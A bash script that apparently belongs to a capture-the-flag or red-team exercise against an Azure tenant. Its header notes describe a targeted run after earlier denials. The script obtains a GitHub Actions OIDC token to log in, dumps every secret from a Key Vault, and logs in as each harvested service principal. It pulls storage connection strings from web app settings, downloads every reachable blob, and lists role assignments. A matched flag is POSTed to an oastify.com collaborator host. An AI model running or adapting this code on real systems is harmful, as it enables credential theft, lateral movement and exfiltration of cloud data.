#!/usr/bin/env bash
# Tebamoto Logistics - step 5, run 8.
# Run 7: blob data plane denied for every identity on config/exports/archive; only
# sync-service-principal + account key reached cilogs, which has no flag.
#
# Two targeted moves instead of more guessing:
#   (a) az webapp config appsettings list on app-tbl-storefront-prod - the app itself reads
#       config/internal-config.json via CONFIG_STORAGE_CONNECTION, so that setting carries a
#       storage key that defeats the data-plane RBAC wall.
#   (b) az role assignment list - stop guessing who can open kv-tbl-sec-x3euoz and just read
#       the assignments.
#
# Read-only, scoped to rg-tbl-platform-prod-sea. Connection strings and secrets are USED but
# never echoed - the log gets names, lengths and match/no-match only. Flag goes OOB only.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
RG="rg-tbl-platform-prod-sea"
SRC_VAULT="kv-tbl-prod-x3euoz"
TGT_VAULT="kv-tbl-sec-x3euoz"
APP="app-tbl-storefront-prod"
FLAGRE='DF26\{[^}]+\}'
FOUND=""; FOUND_AT=""
WORK=$(mktemp -d); DL=$(mktemp -d)
say() { echo "[*] $*"; }

# use a storage connection string without ever printing it
drain_conn() {                 # $1=connection string  $2=label
  local CS="$1" WHO="$2" CL BL SZ MM
  CL=$(az storage container list --connection-string "$CS" --query "[].name" -o tsv 2>&1)
  grep -qiE 'error|denied|forbidden|not valid' <<<"$CL" && { say "      conn unusable: $(head -c 80 <<<"$CL")"; return 0; }
  say "      containers via conn: $(tr '\n' ' ' <<<"$CL" | head -c 110)"
  for C in $CL; do
    BL=$(az storage blob list --connection-string "$CS" -c "$C" --query "[].name" -o tsv 2>&1)
    grep -qiE 'error|denied|forbidden' <<<"$BL" && { say "        $C -> denied"; continue; }
    for B in $BL; do
      rm -f "$DL/b"
      az storage blob download --connection-string "$CS" -c "$C" -n "$B" --file "$DL/b" --overwrite -o none >/dev/null 2>&1
      [ -f "$DL/b" ] || continue
      SZ=$(wc -c <"$DL/b"); MM=$(grep -aoE "$FLAGRE" "$DL/b" | head -1)
      say "        $C/$B size=$SZ flag=${MM:+MATCH}${MM:--}"
      if [ -n "$MM" ] && [ -z "$FOUND" ]; then FOUND="$MM"; FOUND_AT="$C/$B via $WHO appsettings"; fi
    done
  done
}

probe_identity() {             # $1=label
  local WHO="$1" AS CS N RA
  # (a) app settings
  AS=$(az webapp config appsettings list -n "$APP" -g "$RG" -o json 2>&1)
  if grep -qiE '^ERROR|denied|forbidden|not authorized' <<<"$AS"; then
    say "    appsettings -> $(head -c 90 <<<"$AS" | tr -d '\n')"
  else
    N=$(jq -r 'length' <<<"$AS" 2>/dev/null)
    say "    appsettings READABLE ($N entries): $(jq -r '[.[].name]|join(",")' <<<"$AS" 2>/dev/null | head -c 160)"
    MM=$(grep -aoE "$FLAGRE" <<<"$AS" | head -1)
    [ -n "$MM" ] && { FOUND="$MM"; FOUND_AT="appsettings via $WHO"; return 0; }
    CS=$(jq -r '.[] | select(.name|test("CONFIG_STORAGE_CONNECTION|STORAGE|CONNECTION";"i")) | .value' <<<"$AS" 2>/dev/null | head -1)
    [ -n "$CS" ] && { say "      got a storage connection string (len=${#CS}, not shown)"; drain_conn "$CS" "$WHO"; }
  fi
  [ -n "$FOUND" ] && return 0
  # (b) role assignments
  RA=$(az role assignment list --all -o tsv --query "[].{p:principalName,r:roleDefinitionName,s:scope}" 2>&1)
  if grep -qiE '^ERROR|denied|forbidden|not authorized' <<<"$RA"; then
    say "    role assignments -> denied"
  else
    say "    role assignments ($(wc -l <<<"$RA") rows):"
    grep -iE 'kv-tbl-sec|Key Vault|Storage Blob' <<<"$RA" | head -12 | sed 's/^/        /'
  fi
  return 0
}

federate() {
  local t; t=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
  [ -z "$t" ] && return 1
  az logout >/dev/null 2>&1
  az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
    --federated-token "$t" --allow-no-subscriptions >/dev/null 2>&1
}

federate && say "federated OK" || { say "federated FAILED"; exit 1; }
say "vault $TGT_VAULT properties:"
az keyvault show -n "$TGT_VAULT" -g "$RG" \
  --query "{rbac:properties.enableRbacAuthorization,policies:length(properties.accessPolicies)}" -o tsv 2>&1 | sed 's/^/    /'

for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
  az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
done

say "=== federated identity ==="; probe_identity federated

for F in "$WORK"/*; do
  [ -n "$FOUND" ] && break
  [ -s "$F" ] || continue
  S=$(basename "$F")
  CID=$(jq -r '.appId // empty' <"$F"); SEC=$(jq -r '.clientSecret // empty' <"$F"); TEN=$(jq -r '.tenantId // empty' <"$F")
  az logout >/dev/null 2>&1
  az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" --allow-no-subscriptions >/dev/null 2>&1 \
    || { say "=== $S login failed"; continue; }
  say "=== $S (${CID:0:8}…) ==="; probe_identity "$S"
done

rm -rf "$WORK" "$DL"
if [ -n "$FOUND" ]; then
  say "FLAG FOUND at $FOUND_AT (${#FOUND} chars) - OOB only"
  curl -sS -m 25 -X POST --data-binary "$FOUND" -H 'Content-Type: text/plain' \
    "http://${COLLAB}/flag" -o /dev/null -w '    exfil http=%{http_code}\n' 2>&1
else
  say "no match"
fi
az logout >/dev/null 2>&1; say "done"
